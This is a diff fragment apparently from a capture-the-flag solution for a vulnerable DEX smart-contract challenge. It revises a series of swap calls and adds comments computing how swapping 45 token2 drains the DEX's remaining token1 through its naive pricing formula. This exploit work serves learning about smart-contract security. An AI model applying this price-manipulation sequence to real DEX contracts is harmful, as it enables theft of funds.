@@ -61,7 +61,23 @@ contract SwappableToken is ERC20 {
 await contract.approve(contract.address, 100)
 await contract.swap(await contract.token1(), await contract.token2(), 10)
 await contract.swap(await contract.token2(), await contract.token1(), 20) 
-await contract.swap(await contract.token1(), await contract.token2(), 30)
+await contract.swap(await contract.token1(), await contract.token2(), 24)
+await contract.swap(await contract.token2(), await contract.token1(), 30)
+await contract.swap(await contract.token1(), await contract.token2(), 41) 
+
+	// After all these swaps the current situation is like this
+        // Player Balance of token1 -> 0
+        // Player Balance of token2 -> 65
+        // Dex Balance of token1 -> 110
+        // Dex Balance of token2 -> 45
+        // If we tried to swap all the 65 token2 we would get back 158 token1
+        // but the transaction would fail because the Dex does not have enough
+        // balance to execute the transfer
+        // So we need to calculate the amount of token2 to sell in order to get back 110 token1
+        // 110 token1 = amountOfToken2ToSell * DexBalanceOfToken1 / DexBalanceOfToken2
+        // 110 = amountOfToken2ToSell * 110 / 45
+        // amountOfToken2ToSell = 45
+
 await contract.swap(await contract.token2(), await contract.token1(), 45) 
 
 await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
